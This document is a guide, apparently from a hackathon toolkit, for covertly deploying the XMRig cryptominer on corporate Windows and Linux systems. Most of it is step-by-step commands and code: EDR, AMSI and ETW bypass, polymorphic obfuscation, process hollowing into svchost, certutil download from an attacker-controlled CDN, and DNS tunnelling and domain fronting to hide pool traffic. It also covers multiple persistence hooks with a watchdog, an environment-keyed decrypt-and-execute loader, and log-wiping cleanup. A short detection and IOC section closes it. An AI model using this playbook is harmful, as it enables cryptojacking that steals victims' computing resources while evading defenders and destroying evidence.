# XMRig Deployment Scenarios - Complete Evasion Guide

**OSCP Hackathon 2025 - Integrated Deployment Documentation**

**Purpose**: Complete end-to-end deployment scenarios combining all evasion techniques for maximum stealth.

**Classification**: Educational - Red Team Training Material

---

## Table of Contents

1. [Scenario Overview](#scenario-overview)
2. [Scenario 1: APT-Level Stealth Deployment](#scenario-1-apt-level-stealth-deployment)
3. [Scenario 2: Quick Opportunistic Deployment](#scenario-2-quick-opportunistic-deployment)
4. [Scenario 3: Network-Evading Deployment](#scenario-3-network-evading-deployment)
5. [Scenario 4: Long-Term Persistent Deployment](#scenario-4-long-term-persistent-deployment)
6. [Scenario 5: Domain-Targeted Deployment](#scenario-5-domain-targeted-deployment)
7. [Blue Team Detection Guide](#blue-team-detection-guide)
8. [Troubleshooting](#troubleshooting)

---

## Scenario Overview

### Complexity Levels

**Level 1: Basic** - Simple deployment, moderate detection risk
- Tools: `stealth_deploy.sh`, standard configs
- Time: 5-10 minutes
- Evasion Score: 4/10

**Level 2: Intermediate** - Obfuscation + network evasion
- Tools: `obfuscate_binary_v2.py`, `c2_tunnel.py`
- Time: 15-30 minutes
- Evasion Score: 6/10

**Level 3: Advanced** - Full EDR bypass + in-memory execution
- Tools: `edr_bypass.py`, `stealth_loader.py`, polymorphic generation
- Time: 45-60 minutes
- Evasion Score: 8/10

**Level 4: APT** - Complete evasion stack + environmental keying
- Tools: All tools + custom techniques
- Time: 2-4 hours
- Evasion Score: 9/10

### Tools Reference

| Tool | Purpose | Scenario |
|------|---------|----------|
| `obfuscate_binary.py` | Basic XMRig obfuscation | 1, 2, 3, 4, 5 |
| `obfuscate_binary_v2.py` | Polymorphic obfuscation | 1, 3, 4, 5 |
| `edr_bypass.py` | EDR bypass (AMSI/ETW) | 1, 3, 4, 5 |
| `stealth_loader.py` | In-memory execution | 1, 3, 4, 5 |
| `c2_tunnel.py` | DNS tunneling | 3, 5 |
| `stealth_deploy.sh` | Automated deployment | 1, 2, 4, 5 |
| Domain fronting setup | Traffic hiding | 3, 5 |

---

## Scenario 1: APT-Level Stealth Deployment

**Objective**: Deploy XMRig with maximum stealth against advanced EDR.

**Target Environment**:
- Windows 10/11 Enterprise with EDR (CrowdStrike, SentinelOne, or Defender for Endpoint)
- Network monitoring (DPI)
- Application whitelisting (AppLocker)
- Domain-joined systems

**Evasion Score Target**: 9/10

### Phase 1: Reconnaissance (15 minutes)

**Step 1.1: Environmental Assessment**

```bash
# On target system
cd /home/kali/OSCP/defensive_research/xmrig_analysis

# Check environment
python3 -c "
import os
print(f'Domain: {os.environ.get(\"USERDOMAIN\", \"N/A\")}')
print(f'Computer: {os.environ.get(\"COMPUTERNAME\", \"N/A\")}')
print(f'User: {os.environ.get(\"USERNAME\", \"N/A\")}')
"

# Detect EDR
python3 offensive_toolkit/payloads/edr_bypass.py --detect-edr --detect-hooks
```

**Expected Output**:
```
[!] Detected: crowdstrike (CSFalconService)
[!] HOOKED: ntdll.dll!NtAllocateVirtualMemory
[!] HOOKED: ntdll.dll!NtProtectVirtualMemory
```

**Step 1.2: Document Findings**

Create `scenario_1_recon.txt`:
```
Target Domain: CORP
EDR Present: CrowdStrike Falcon
Hooks Detected: Yes (8/10 functions)
AppLocker: Enabled
Network Monitoring: Likely DPI
Recommended Approach: Full evasion stack with direct syscalls
```

### Phase 2: Payload Preparation (30 minutes)

**Step 2.1: Generate Polymorphic XMRig**

```bash
# Create unique binary signature
python3 offensive_toolkit/payloads/obfuscate_binary_v2.py \
    --input xmrig-6.24.0/xmrig \
    --output xmrig_obfuscated.bin \
    --level 4 \
    --polymorphic \
    --encoding xor-rot-aes \
    --iterations 3

# Output:
# [+] Polymorphic engine initialized
# [+] Applying 3 encoding layers...
# [+] Obfuscation level: MAXIMUM
# [+] Output: xmrig_obfuscated.bin
# [+] Signature uniqueness: 100%
```

**Step 2.2: Prepare Configuration with DNS over HTTPS**

```bash
# Create stealth config
cat > xmrig_config_stealth.json <<EOF
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 12,
        "priority": 0
    },
    "donate-level": 0,
    "log-file": null,
    "pools": [
        {
            "url": "127.0.0.1:3333",
            "user": "WALLET_ADDRESS",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ],
    "pause-on-active": 120,
    "pause-on-battery": true,
    "background": true,
    "syslog": false,
    "randomx": {
        "mode": "light"
    }
}
EOF
```

**Step 2.3: Environmental Keying**

```python
# Create environmentally-keyed payload
python3 <<EOF
import hashlib
from pathlib import Path
from cryptography.fernet import Fernet
import base64

# Read obfuscated XMRig
xmrig = Path('xmrig_obfuscated.bin').read_bytes()

# Derive key from target environment
target_domain = "CORP"
target_computer = "WS001"  # Target computer name pattern
env_string = f"{target_domain}{target_computer}ADMIN".encode()
key = base64.urlsafe_b64encode(hashlib.sha256(env_string).digest())

# Encrypt
cipher = Fernet(key)
encrypted = cipher.encrypt(xmrig)

Path('xmrig_keyed.enc').write_bytes(encrypted)
print(f"[+] Encrypted payload: {len(encrypted)} bytes")
print(f"[+] Will only decrypt on: {target_domain}\\\\{target_computer}")
EOF
```

### Phase 3: Network Infrastructure (45 minutes)

**Step 3.1: Setup DNS Tunneling Server**

```bash
# On your C2 server (192.168.45.100)

# Install dependencies
sudo apt install -y python3-dnspython

# Configure DNS server to handle queries
# (Simplified - use c2_tunnel.py server component)

# Test DNS tunnel
python3 offensive_toolkit/c2/c2_tunnel.py \
    --pool pool.supportxmr.com \
    --dns 8.8.8.8 \
    --domain tunnel.yourdomain.com \
    --port 3333
```

**Step 3.2: Setup Domain Fronting (Optional)**

```bash
# Follow DOMAIN_FRONTING_SETUP.md
# Key steps:
# 1. Add domain to Cloudflare
# 2. Configure DNS record (proxied)
# 3. Setup Nginx reverse proxy
# 4. Test with curl

# Quick test:
curl -v https://xmrig.yourdomain.com/health
# Expected: HTTP/2 200 OK
```

### Phase 4: EDR Bypass (20 minutes)

**Step 4.1: Disable AMSI and ETW**

```bash
# Create bypass script
cat > bypass.py <<EOF
#!/usr/bin/env python3
import sys
sys.path.insert(0, 'offensive_toolkit/payloads')

from edr_bypass import EDRBypass

bypasser = EDRBypass()
bypasser.print_banner()

# Detect and bypass
bypasser.detect_edr_processes()
bypasser.detect_hooks()
bypasser.bypass_amsi_all()
bypasser.bypass_etw_all()
bypasser.print_summary()
EOF

# Execute (requires Windows target)
python3 bypass.py
```

**Expected Output**:
```
[+] AMSI bypassed successfully
[+] ETW bypassed successfully
[*] Evasion score: 8/10
```

### Phase 5: Deployment (30 minutes)

**Step 5.1: Transfer Payload**

```bash
# Method 1: HTTPS download (obfuscated)
# On target:
certutil -urlcache -split -f https://cdn.yourdomain.com/update.bin xmrig_keyed.enc

# Method 2: SMB transfer
# Copy to network share with legitimate name
cp xmrig_keyed.enc //fileserver/public$/WindowsUpdate.dat

# Method 3: DNS exfiltration (if needed)
# Split file and transfer via DNS queries
```

**Step 5.2: In-Memory Loading**

```bash
# Use stealth_loader.py with process hollowing
python3 offensive_toolkit/payloads/stealth_loader.py \
    --binary xmrig_obfuscated.bin \
    --config xmrig_config_stealth.json \
    --method hollowing \
    --target-binary "C:\\Windows\\System32\\svchost.exe"
```

**Expected Output**:
```
[*] Process Hollowing Method
[+] Process created (PID: 4892)
[+] Original image unmapped
[+] Allocated at: 0x7FFE12340000
[+] All sections written
[+] Process hollowing complete!
[+] XMRig running as C:\Windows\System32\svchost.exe
```

**Step 5.3: Establish Network Tunnel**

```bash
# Start DNS tunnel client (if using DNS tunneling)
python3 offensive_toolkit/c2/c2_tunnel.py \
    --pool pool.supportxmr.com \
    --dns 8.8.8.8 \
    --domain tunnel.yourdomain.com \
    --port 3333

# XMRig connects to 127.0.0.1:3333
# Traffic tunneled through DNS
```

### Phase 6: Persistence (15 minutes)

**Step 6.1: Install Persistence**

```bash
# Use multiple persistence methods
./offensive_toolkit/persistence/install_persistence.sh

# Select options:
# [1] Systemd service (root) - Priority 1
# [3] RC.local - Priority 2
# [5] XDG autostart - Priority 3
```

**Step 6.2: Verify Persistence**

```bash
# Check systemd service
systemctl status xmrig-monitor.service

# Check rc.local
cat /etc/rc.local | grep xmrig

# Check XDG autostart
ls ~/.config/autostart/ | grep desktop
```

### Phase 7: Verification (10 minutes)

**Step 7.1: Process Check**

```bash
# Verify XMRig is running
ps aux | grep -i xmrig

# Check network connections
netstat -an | grep 3333
```

**Step 7.2: Mining Pool Check**

```bash
# Check pool connection
curl -s https://api.supportxmr.com/stats/address/YOUR_WALLET | jq '.stats.hashrate'
```

**Step 7.3: Stealth Verification**

```bash
# CPU usage should be throttled
top -bn1 | grep xmrig

# Network traffic should be encrypted/tunneled
tcpdump -i any -n 'port 3333' -c 10
```

### Phase 8: Cleanup (10 minutes)

**Step 8.1: Remove Deployment Artifacts**

```bash
# Run cleanup script
./offensive_toolkit/cleanup/forensic_cleanup.sh --auto

# Verify cleanup
ls -la /tmp/ | grep xmrig  # Should be empty
history | grep xmrig       # Should be empty
```

### Success Criteria

✅ XMRig running without EDR detection
✅ Network traffic hidden via DNS tunnel or domain fronting
✅ Persistence established (3+ methods)
✅ CPU usage throttled (< 25%)
✅ No obvious process names or artifacts
✅ Event logs cleared
✅ Evasion score ≥ 8/10

---

## Scenario 2: Quick Opportunistic Deployment

**Objective**: Rapid deployment for short-term mining.

**Target Environment**:
- Standard Windows 10 with Windows Defender
- No EDR
- Workstation (non-domain)

**Evasion Score Target**: 5/10
**Time Budget**: 15 minutes

### Quick Deployment Steps

```bash
# 1. Basic obfuscation (2 min)
python3 offensive_toolkit/payloads/obfuscate_binary.py \
    --input xmrig-6.24.0/xmrig \
    --output xmrig_quick.bin \
    --xor-key 0xAB

# 2. Deploy with automation (3 min)
./offensive_toolkit/deployment/stealth_deploy.sh \
    --binary xmrig_quick.bin \
    --config offensive_toolkit/configs/aggressive.json \
    --install-dir /opt/system-monitor \
    --persistence systemd

# 3. Verify (2 min)
systemctl status system-monitor.service
ps aux | grep xmrig

# Total: ~7 minutes
```

**Success Criteria**:
✅ XMRig running
✅ Basic obfuscation applied
✅ Systemd persistence
✅ Mining at ~80-100% CPU

---

## Scenario 3: Network-Evading Deployment

**Objective**: Bypass DPI and network monitoring.

**Target Environment**:
- Enterprise network with DPI
- Firewall blocks mining pools
- IDS/IPS monitoring

**Evasion Score Target**: 7/10
**Focus**: Network stealth

### Network Evasion Steps

**Step 1: Setup Domain Fronting**

```bash
# Complete domain fronting setup
# See: offensive_toolkit/c2/DOMAIN_FRONTING_SETUP.md

# Key points:
# - Cloudflare CDN as fronting layer
# - Nginx reverse proxy to real pool
# - SSL/TLS encryption throughout
```

**Step 2: DNS Tunneling Alternative**

```bash
# Setup DNS tunnel server
python3 offensive_toolkit/c2/c2_tunnel.py \
    --pool pool.supportxmr.com \
    --dns 8.8.8.8 \
    --domain tunnel.example.com \
    --port 3333

# Start tunnel client on target
python3 c2_tunnel_client.py \
    --pool pool.supportxmr.com \
    --dns 8.8.8.8 \
    --domain tunnel.example.com
```

**Step 3: Traffic Obfuscation**

```json
// Configure XMRig with obfuscated traffic
{
    "pools": [{
        "url": "xmrig.yourdomain.com:443",  // Domain fronting
        "user": "WALLET",
        "pass": "x",
        "tls": true,                         // Encrypted
        "keepalive": true,
        "custom-diff": 100000                // Reduce connection frequency
    }],
    "pause-on-active": 90  // Reduce during work hours
}
```

**Success Criteria**:
✅ Traffic appears as HTTPS to legitimate CDN
✅ No direct connections to mining pools
✅ IDS/IPS does not flag traffic
✅ Stratum protocol hidden inside DNS or HTTPS

---

## Scenario 4: Long-Term Persistent Deployment

**Objective**: Maintain presence for extended period.

**Target Environment**:
- Mixed Windows/Linux environment
- Reboots expected
- User activity varies

**Evasion Score Target**: 6/10
**Focus**: Persistence and reliability

### Persistence Deployment

**Step 1: Multi-Method Persistence**

```bash
# Install all persistence methods
./offensive_toolkit/persistence/install_persistence.sh

# Select all:
# [1] Systemd service (root)
# [2] Systemd service (user)
# [3] Cron job
# [4] RC.local
# [5] Bashrc
# [6] XDG autostart
# [7] At job
```

**Step 2: Watchdog Process**

```bash
# Create watchdog script
cat > /opt/xmrig/.watchdog.sh <<'EOF'
#!/bin/bash
while true; do
    if ! pgrep -f "systemd-monitor" > /dev/null; then
        /opt/xmrig/systemd-monitor -c /opt/xmrig/.config.json --background
    fi
    sleep 300  # Check every 5 minutes
done
EOF

chmod +x /opt/xmrig/.watchdog.sh

# Add to cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /opt/xmrig/.watchdog.sh") | crontab -
```

**Step 3: Configuration Backup**

```bash
# Backup config to multiple locations
cp /opt/xmrig/.config.json /var/tmp/.sys-config
cp /opt/xmrig/.config.json ~/.cache/.app-settings
cp /opt/xmrig/.config.json /tmp/.runtime-conf

# Restore on startup
cat >> ~/.bashrc <<'EOF'
if [ ! -f /opt/xmrig/.config.json ] && [ -f /var/tmp/.sys-config ]; then
    cp /var/tmp/.sys-config /opt/xmrig/.config.json
fi
EOF
```

**Success Criteria**:
✅ Survives reboots
✅ Auto-restarts if killed
✅ Multiple persistence mechanisms
✅ Configuration backed up
✅ Runs for 30+ days

---

## Scenario 5: Domain-Targeted Deployment

**Objective**: Deploy only on specific corporate domain.

**Target Environment**:
- Corporate domain: TARGETCORP
- Windows Active Directory
- Specific computer naming pattern

**Evasion Score Target**: 8/10
**Focus**: Environmental keying

### Environmental Keying Deployment

**Step 1: Create Keyed Payload**

```python
#!/usr/bin/env python3
# key_payload.py

import hashlib
import base64
from pathlib import Path
from cryptography.fernet import Fernet

def create_keyed_payload(xmrig_path, target_domain, target_pattern):
    """Create environmentally-keyed XMRig"""

    # Read XMRig
    xmrig = Path(xmrig_path).read_bytes()

    # Create key from environment
    env_string = f"{target_domain}{target_pattern}".encode()
    key = base64.urlsafe_b64encode(hashlib.sha256(env_string).digest())

    # Encrypt
    cipher = Fernet(key)
    encrypted = cipher.encrypt(xmrig)

    # Save
    output = f"xmrig_{target_domain}_keyed.enc"
    Path(output).write_bytes(encrypted)

    print(f"[+] Created keyed payload: {output}")
    print(f"[+] Target domain: {target_domain}")
    print(f"[+] Computer pattern: {target_pattern}")
    print(f"[+] Payload will only decrypt on matching environment")

    return output

# Usage
create_keyed_payload(
    "xmrig-6.24.0/xmrig",
    "TARGETCORP",
    "WS*"  # Matches WS001, WS002, etc.
)
```

**Step 2: Create Decryption Loader**

```python
#!/usr/bin/env python3
# decrypt_and_execute.py

import os
import hashlib
import base64
from pathlib import Path
from cryptography.fernet import Fernet
import subprocess

def decrypt_and_execute(encrypted_path):
    """Decrypt and execute if environment matches"""

    # Get current environment
    domain = os.environ.get('USERDOMAIN', '')
    computer = os.environ.get('COMPUTERNAME', '')

    print(f"[*] Current domain: {domain}")
    print(f"[*] Current computer: {computer}")

    # Try to decrypt
    encrypted = Path(encrypted_path).read_bytes()

    # Generate key from environment
    env_string = f"{domain}WS*".encode()  # Pattern match
    key = base64.urlsafe_b64encode(hashlib.sha256(env_string).digest())

    try:
        cipher = Fernet(key)
        xmrig = cipher.decrypt(encrypted)

        print("[+] Decryption successful!")
        print("[+] Environment match confirmed")

        # Write to temp location
        temp_path = "/tmp/.system-process"
        Path(temp_path).write_bytes(xmrig)
        os.chmod(temp_path, 0o755)

        # Execute
        print("[*] Executing XMRig...")
        subprocess.Popen([temp_path, "-c", "/opt/xmrig/.config.json", "--background"])

        print("[+] XMRig started")
        return True

    except Exception as e:
        print("[-] Decryption failed - wrong environment")
        print("[*] This payload is not for this system")
        return False

# Usage
decrypt_and_execute("xmrig_TARGETCORP_keyed.enc")
```

**Step 3: Deploy with Verification**

```bash
# Transfer encrypted payload
scp xmrig_TARGETCORP_keyed.enc user@target:/tmp/update.dat

# Transfer decryption loader
scp decrypt_and_execute.py user@target:/tmp/installer.py

# Execute on target
ssh user@target "python3 /tmp/installer.py"

# Expected output on correct domain:
# [+] Decryption successful!
# [+] Environment match confirmed
# [+] XMRig started

# Expected output on wrong domain:
# [-] Decryption failed - wrong environment
# [*] This payload is not for this system
```

**Success Criteria**:
✅ Payload only decrypts on target domain
✅ Fails gracefully on wrong environment
✅ No artifacts left if decryption fails
✅ Sandbox analysis gets encrypted blob
✅ Domain-specific key derivation works

---

## Blue Team Detection Guide

### Detection Points by Scenario

**Scenario 1 (APT-Level)**:
- Memory scanning for unbacked executables
- Syscall source monitoring
- DNS tunneling pattern detection
- Process relationship anomalies

**Scenario 2 (Quick)**:
- Hash-based detection (if not updated)
- CPU usage spikes
- Network connections to pools
- Systemd service creation

**Scenario 3 (Network-Evading)**:
- DNS query volume anomalies
- HTTPS traffic to CDN with mining patterns
- TLS fingerprinting
- Certificate pinning violations

**Scenario 4 (Persistent)**:
- Multiple persistence mechanisms
- Cron job patterns
- Recurring process spawning
- Configuration file locations

**Scenario 5 (Domain-Targeted)**:
- Encrypted payloads with environmental checks
- Python decryption scripts
- Failed decryption attempts (honeypot)

### Comprehensive IOCs

```yaml
# indicators_of_compromise.yaml

File_Hashes:
  - xmrig_original_sha256: "129cfbfbe4c37a970abab20202639c1481ed0674ff9420d507f6ca4f2ed7796a"
  - Note: Obfuscated versions will have different hashes

File_Paths:
  - /opt/xmrig/
  - /opt/system-monitor/
  - /tmp/.system-process
  - ~/.config/autostart/*.desktop
  - /var/tmp/.sys-config

Process_Names:
  - systemd-monitor
  - kworker-update
  - gnome-session-d
  - xmrig (if not obfuscated)

Network_IOCs:
  - pool.supportxmr.com:3333
  - pool.supportxmr.com:443
  - Excessive DNS TXT queries
  - HTTPS to CDN with high volume

Registry_Keys: # Windows
  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  - HKLM\\System\\CurrentControlSet\\Services

Memory_Indicators:
  - RWX memory regions
  - Unbacked executable memory
  - Modified ntdll.dll .text section
  - Hollowed processes

Behavioral_Indicators:
  - Sustained high CPU usage
  - Network connections from unexpected processes
  - Syscalls from non-system memory
  - Missing ETW events
```

---

## Troubleshooting

### Common Issues and Solutions

**Issue 1: EDR Detection**
```
Symptom: XMRig killed immediately
Solution:
1. Verify edr_bypass.py executed successfully
2. Check for hooks: python3 edr_bypass.py --detect-hooks
3. Use direct syscalls or process hollowing
4. Increase obfuscation level
```

**Issue 2: Network Blocked**
```
Symptom: Cannot connect to mining pool
Solution:
1. Setup DNS tunneling: c2_tunnel.py
2. Configure domain fronting
3. Use HTTPS on port 443
4. Try alternative pools
```

**Issue 3: Persistence Fails**
```
Symptom: XMRig doesn't survive reboot
Solution:
1. Check systemd service: systemctl status service-name
2. Verify cron job: crontab -l
3. Check file permissions: ls -la /opt/xmrig/
4. Review logs: journalctl -u service-name
```

**Issue 4: Low Hash Rate**
```
Symptom: Hash rate lower than expected
Solution:
1. Reduce pause-on-active timer
2. Increase max-threads-hint
3. Check CPU throttling: cat /proc/cpuinfo | grep MHz
4. Verify huge pages if available
```

**Issue 5: Environmental Keying Fails**
```
Symptom: Decryption errors
Solution:
1. Verify environment variables match
2. Check domain name: echo $USERDOMAIN
3. Check computer name: echo $COMPUTERNAME
4. Review key derivation logic
5. Test with debug output
```

---

## Conclusion

These scenarios demonstrate progressive sophistication in XMRig deployment:

**Scenario 1** = Maximum stealth, maximum effort
**Scenario 2** = Quick wins, moderate stealth
**Scenario 3** = Network focus, bypass DPI
**Scenario 4** = Persistence focus, long-term
**Scenario 5** = Targeting focus, environmental keying

**For Blue Team Training**: Understanding these attack chains improves defensive capabilities and detection engineering.

**Remember**: All techniques are for **authorized defensive training only**. Use in controlled environments with explicit permission.

---

**Document Version**: 1.0
**Last Updated**: 2025-10-02
**Classification**: Educational - Authorized Testing Only
**Related Docs**: All offensive_toolkit documentation, EDR_BYPASS_TECHNIQUES.md, NETWORK_EVASION_C2.md
